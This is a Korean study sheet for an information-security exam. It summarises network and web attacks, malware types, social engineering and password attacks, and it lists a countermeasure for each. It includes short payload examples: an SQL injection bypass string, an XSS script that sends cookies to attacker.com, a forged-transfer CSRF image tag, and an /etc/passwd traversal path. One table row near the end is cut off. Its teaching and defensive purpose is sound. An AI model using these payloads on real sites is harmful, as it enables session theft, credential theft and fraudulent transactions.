DoS / DDoS 공격

DoS (Denial of Service)
서비스 거부 공격 — 단일 출발지
가용성
▾
  • SYN Flooding: TCP 3-way 핸드셰이크의 SYN 패킷을 대량 전송 → 서버의 연결 대기 큐(Backlog Queue) 고갈 / 대응: SYN Cookie, 방화벽 SYN Rate Limit
  • Smurf 공격: 피해자 IP를 출발지로 위조 + 브로드캐스트 ICMP Echo Request → 수많은 응답이 피해자에게 집중 / 대응: 브로드캐스트 ICMP 차단
  • Ping of Death: IP 최대 크기(65,535바이트)를 초과하는 패킷 전송 → 시스템 충돌 / 현재 대부분 패치됨
  • Land 공격: 출발지 IP = 목적지 IP로 위조 → 자기 자신에게 패킷 전송 → 무한루프
  • Teardrop 공격: IP 단편화(Fragmentation) 시 오프셋 값을 겹치게 조작 → 재조립 오류 발생
DDoS (Distributed DoS)
분산 서비스 거부 — 다수 좀비 PC 활용
분산
▾
  • 구조: 공격자(Master) → C&C 서버 → 좀비 PC(Botnet, Agent) → 피해자
  • HTTP Flooding (CC 공격): 정상 HTTP 요청을 대량 전송 — L7 공격, 방화벽 우회 어려움
  • DNS Amplification: 작은 DNS 쿼리로 큰 응답 유도 → 증폭 비율(Amplification Factor) 활용
  • NTP Amplification: NTP monlist 명령으로 증폭 공격
  • 대응: 블랙홀 라우팅, Anycast 분산, CDN, 클라우드 DDoS 방어, 임계치 기반 Rate Limiting
SYN Flooding=TCP Backlog 고갈 / Smurf=브로드캐스트 증폭 / DDoS=Botnet 활용 분산

스푸핑 (Spoofing) 공격

ARP 스푸핑 (ARP Spoofing)
MAC 주소 위조 — LAN 내부 공격
내부망
▾
  • 원리: 위조된 ARP Reply로 피해자의 ARP 캐시를 오염 → 공격자 MAC 주소를 게이트웨이 IP에 매핑
  • 결과: 피해자의 트래픽이 공격자를 경유 → 도청(스니핑)·변조 가능 (MITM)
  • 대응: 동적 ARP 검사(DAI, Dynamic ARP Inspection), 정적 ARP 테이블, ARP 스푸핑 탐지 도구
IP 스푸핑 / DNS 스푸핑
IP·DNS 레코드 위조
위조
▾
  • IP 스푸핑: 패킷의 출발지 IP를 위조 → 추적 방해, DoS 공격 출발지 은닉
  • DNS 스푸핑(DNS Cache Poisoning): DNS 캐시에 위조된 IP를 저장 → 사용자를 가짜 사이트로 유도
  • DNS 하이재킹: DNS 서버 자체를 변조하거나 라우터 DNS 설정 변경
  • 대응: DNSSEC 적용, DNS over HTTPS(DoH), DNS 응답 검증
ARP 스푸핑 = LAN 내부 MAC 위조 → MITM / DNS 스푸핑 = 캐시 오염 → 가짜 사이트 유도
👁️

스니핑 · MITM · 세션 하이재킹

스니핑 (Sniffing)
네트워크 도청 — 수동적 공격
수동적
▾
  • NIC를 무차별 모드(Promiscuous Mode)로 설정 → 자신에게 오지 않는 패킷도 캡처
  • 허브 환경: 브로드캐스트 → 쉽게 스니핑 / 스위치 환경: ARP 스푸핑 필요
  • 대응: 암호화 통신(TLS/SSL), 스위치 네트워크 사용, VPN
MITM (Man-in-the-Middle)
중간자 공격 — 능동적 도청·변조
능동적
▾
  • 통신 양단 사이에 공격자가 끼어들어 도청·변조·주입
  • ARP 스푸핑 → MITM: 가장 일반적인 LAN 내부 MITM
  • SSL Stripping: HTTPS → HTTP로 다운그레이드 강제
  • 대응: TLS 인증서 검증, HSTS(HTTP Strict Transport Security), 인증서 핀닝
세션 하이재킹 (Session Hijacking)
유효 세션 탈취
세션탈취
▾
  • 인증 후 생성된 세션 ID를 탈취 → 재인증 없이 피해자 세션으로 서비스 이용
  • 세션 ID 탈취 방법: XSS로 쿠키 탈취, 스니핑, URL에 세션 ID 노출
  • TCP 세션 하이재킹: 시퀀스 번호 예측으로 TCP 세션 탈취
  • 대응: HttpOnly·Secure 쿠키, TLS, 세션 ID 재발급, 짧은 세션 유효시간
스니핑=수동적 도청 / MITM=능동적 중간 개입 / 세션하이재킹=세션ID 탈취 후 위장

인젝션 공격 — SQL 인젝션 · Command 인젝션

SQL 인젝션 (SQL Injection)
OWASP Top 10 — 입력값으로 SQL 쿼리 조작
⭐고빈출
▾
  • 원리: 사용자 입력값이 SQL 쿼리에 그대로 삽입 → 쿼리 구조 변경
  • 일반 SQL 인젝션: 인증 우회 (' OR '1'='1) → WHERE절 항상 참
  • 블라인드 SQL 인젝션: 직접 데이터 반환 없이 참/거짓으로 데이터 추론
  • Union 기반: UNION SELECT로 다른 테이블 데이터 추출
  • Error 기반: 오류 메시지에서 DB 구조 파악
-- 취약한 쿼리 (입력: ' OR '1'='1) SELECT * FROM users WHERE id='' OR '1'='1' -- 결과: 모든 사용자 반환 → 인증 우회 -- 대응: Prepared Statement (파라미터 바인딩) SELECT * FROM users WHERE id = ? -- ? 자리에 값 바인딩

대응: ①Prepared Statement(가장 강력) ②입력값 검증·이스케이프 ③최소권한 DB계정 ④오류 메시지 숨김 ⑤WAF

SQL 인젝션 = 입력값 → SQL 구조 변조 / 대응: Prepared Statement (파라미터 바인딩)

XSS · CSRF — 웹 보안 공격

XSS (Cross-Site Scripting)
악성 스크립트 삽입 → 피해자 브라우저 실행
⭐고빈출
▾
  • Stored XSS (저장형): 악성 스크립트를 DB에 저장 → 다른 사용자가 페이지 조회 시 실행
  • Reflected XSS (반사형): URL 파라미터에 스크립트 삽입 → 서버가 그대로 반환 → 즉시 실행
  • DOM Based XSS: 서버 거치지 않고 클라이언트 DOM 조작으로 실행
  • 공격 결과: 세션 쿠키 탈취, 키로거 삽입, 피싱 페이지로 리다이렉트
// 악성 스크립트 예시 <script>document.location='http://attacker.com/steal?c='+document.cookie;</script> // 대응: 출력 시 HTML 인코딩(< → &lt;), CSP(Content Security Policy)

대응: ①출력 HTML 인코딩 ②CSP(Content-Security-Policy) 헤더 ③HttpOnly 쿠키 ④입력값 검증

CSRF (Cross-Site Request Forgery)
사용자 의지와 무관한 요청 위조
위조요청
▾
  • 원리: 로그인된 사용자가 공격자 사이트 방문 → 피해 사이트로 위조 요청 전송 (브라우저 쿠키 자동 첨부 악용)
  • XSS vs CSRF 차이: XSS = 스크립트 삽입(서버 신뢰×) / CSRF = 요청 위조(사용자 신뢰×)
  • 대응: CSRF 토큰, SameSite 쿠키 속성, Referer 검증, 이중 쿠키 제출
<!-- 공격자 사이트에 숨겨진 이미지 태그 --> <img src="https://bank.com/transfer?to=attacker&amount=1000000"> // 사용자가 로그인 상태면 브라우저가 자동으로 쿠키 포함 전송

대응: ①CSRF 토큰 ②SameSite=Strict/Lax 쿠키 ③Referer·Origin 헤더 검증

XSS=스크립트 삽입(서버 신뢰×) vs CSRF=요청 위조(사용자 신뢰×) / XSS→HttpOnly / CSRF→CSRF토큰

버퍼 오버플로 · 기타 취약점

버퍼 오버플로 (Buffer Overflow)
메모리 경계 초과 → 임의 코드 실행
⭐고빈출
▾
  • 원리: 배열·버퍼 크기를 초과하는 데이터 입력 → 인접 메모리(리턴 주소) 덮어쓰기 → 공격자 코드 실행
  • 스택 오버플로: 함수 리턴 주소 덮어쓰기 → 쉘코드 실행
  • 힙 오버플로: 동적 할당 영역 덮어쓰기
  • 대응: ①스택 카나리(Stack Canary) ②ASLR(주소 공간 레이아웃 무작위화) ③DEP/NX(실행 불가 데이터 영역) ④Safe 함수 사용(strncpy vs strcpy)
디렉터리 트래버설 / 파일 인클루전
경로 조작으로 임의 파일 접근
경로 공격
▾
  • 디렉터리 트래버설: ../../../etc/passwd로 웹루트 밖 파일 접근
  • LFI(Local File Inclusion): 서버 로컬 파일 포함 실행
  • RFI(Remote File Inclusion): 외부 URL의 파일을 서버에서 실행
  • 대응: 입력값에서 ../ 필터링, 경로 정규화, 화이트리스트 방식
버퍼오버플로 = 메모리 경계 초과 → 리턴주소 덮어쓰기 / 대응: ASLR·DEP·Stack Canary

악성코드 (Malware) 유형 분류

유형특징전파·동작
🦠 바이러스 (Virus)정상 파일에 코드 삽입 — 숙주 파일 필요사용자 실행 시 전파 / 파일·부트 섹터
🐛 웜 (Worm)독립 실행 — 숙주 불필요 / 네트워크 자기 복제취약점 악용, 이메일 첨부, 네트워크 스캔
🐴 트로이목마
(Trojan Horse)		정상 프로그램으로 위장 — 자기 복제 없음사용자가 설치 / 백도어 설치·원격제어
💰 랜섬웨어
(Ransomware)		파일 암호화 후 복호화 조건으로 금전 요구이메일·취약점·공급망 공격 / 비트코인 요구
🕷️ 스파이웨어사용자 모르게 정보 수집·전송키로거, 스크린 캡처, 개인정보 탈취
🚪 백도어 (Backdoor)비밀 접근 통로 설치 — RAT(Remote Access Trojan)악성코드 설치 후 원격 제어 채널 유지
🦴 루트킷 (Rootkit)OS 수준에서 자신과 다른 악성코드 은폐커널·드라이버 레벨 설치 / 탐지 매우 어려움
🤖 봇 (Bot)/좀비공격자 C&C 서버의 명령을 받는 감염 PCDDoS·스팸 발송·암호화폐 채굴 등에 활용
🏠 애드웨어원치 않는 광고 표시무료 소프트웨어와 번들 설치
바이러스(숙주필요) vs 웜(독립·자기복제) vs 트로이목마(위장·복제없음) vs 랜섬웨어(암호화·금전)
🎭

사회공학 (Social Engineering) 공격

기법설명
피싱 (Phishing)이메일·SMS 등으로 가짜 사이트 유도 → 개인정보·자격증명 탈취 / 불특정 다수 대상
스피어 피싱
(Spear Phishing)		특정 개인·조직을 타겟으로 한 맞춤형 피싱 — 공격 성공률 높음
웨일링 (Whaling)CEO·임원 등 고위 경영진을 특정 타겟으로 한 스피어 피싱
비싱 (Vishing)Voice Phishing — 전화로 개인정보 탈취 (보이스피싱)
스미싱 (Smishing)SMS 문자로 악성링크 클릭 유도
베이팅 (Baiting)USB·CD 등 물리적 매체를 호기심 유발 장소에 배치 → 연결 유도
프리텍스팅
(Pretexting)		가짜 신분·상황 연출로 정보 획득 (예: "IT 지원팀인데요...")
큐싱 (Qshing)QR코드를 이용한 피싱 — 가짜 QR코드로 악성 URL 접속 유도
APT (지능형 지속 공격)장기간 은밀하게 지속되는 표적 공격 / 정찰→침투→측면이동→유출
피싱(불특정) → 스피어피싱(특정) → 웨일링(임원) / 큐싱=QR코드 피싱 / APT=장기 표적

패스워드 공격 유형

공격 유형방법대응
무차별 대입
(Brute Force)		모든 가능한 조합을 순차 시도계정 잠금(로그인 시도 횟수 제한), MFA
사전 공격
(Dictionary Attack)		사전 파일의 단어·패턴으로 시도복잡한 패스워드 정책, MFA
레인보우 테이블

(Credential Stuffing)		유출된 ID/PW로 다른 서비스 로그인 시도MFA, 이상 로그인 탐지, 비밀번호 재사용 금지
